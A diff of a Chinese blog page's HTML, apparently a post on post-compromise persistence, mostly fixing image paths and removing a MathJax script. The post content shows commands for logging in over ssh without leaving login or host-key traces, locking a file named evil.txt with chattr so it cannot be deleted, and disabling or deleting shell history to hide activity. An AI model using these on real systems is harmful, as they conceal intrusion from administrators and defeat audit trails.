-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204956273.png" alt="image-20231029204956273"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204956273.png" alt="image-20231029204956273"></p>
 <p>last命令介绍：</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204346797.png" alt="image-20231029204346797"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029204346797.png" alt="image-20231029204346797"></p>
 <pre class="line-numbers language-none"><code class="language-none">#显示最近的登录记录
 last
 #显示特定用户的登录记录
@@ -518,11 +573,17 @@ last -n 10
 last -i
 #显示指定时间范围内的登录记录
 last --since &quot;2023-10-01&quot; --until &quot;2023-10-15&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p>隐身登录手法：</p>
 <pre class="line-numbers language-none"><code class="language-none">#一般隐身登录
 ssh -T root@host &#x2F;bin&#x2F;bash -i
 #隐身登录系统，同时不保存公钥在本地的 .ssh 目录中
 ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h2 id="3、锁定文件"><a href="#3、锁定文件" class="headerlink" title="3、锁定文件"></a>3、锁定文件</h2><p>说明：当文件被锁定时，是无法删除的</p>
 <pre class="line-numbers language-none"><code class="language-none">#锁定文件
 chattr +i evil.txt
@@ -532,14 +593,19 @@ lsattr  evil.txt
 chattr -i evil.txt
 #删除文件
 rm -rf 1.evil.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094648542.png" alt="image-20231030094648542"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094648542.png" alt="image-20231030094648542"></p>
 <h2 id="4、隐藏历史操作记录"><a href="#4、隐藏历史操作记录" class="headerlink" title="4、隐藏历史操作记录"></a>4、隐藏历史操作记录</h2><pre class="line-numbers language-none"><code class="language-none">#临时禁用历史命令记录功能（注意在 set 命令前有一个空格）
  set +o history
 #如果想某条命令不记录到 history 中，直接在命令前加上空格就行，如 ls、 pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094351564.png" alt="image-20231030094351564"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231030094351564.png" alt="image-20231030094351564"></p>
 <pre class="line-numbers language-none"><code class="language-none">#或者使用grep过滤出history中要删除的文件行，再 -d 指定行即可删除，比如第11行记录
 history | grep &quot;key&quot;
 history -d 11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
 <blockquote>
 <p>除此之外，还有在文件前加上 . 实现隐藏文件以及端口复用、进程隐藏等等方法。</p>
 </blockquote>
@@ -682,7 +748,7 @@ var bszCaller,bszTag;!function(){var c,d,e,a=!1,b=[];ready=function(c){return a|
     } 
 setInterval("createtime()",250);
 </script>
-<span class="num"> | 及辞已经在本站记录了: 109.5k 字</span>
+<span class="num"> | 及辞已经在本站记录了: 110.5k 字</span>
 </div> </footer>
 </div> <!-- container-narrow -->
   
@@ -719,21 +785,6 @@ setInterval("createtime()",250);
      searchFunc(path, 'local-search-input', 'local-search-result');
    </script>
 
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/ni-j.model.json"},"display":{"position":"left","width":260,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
    </html>
 
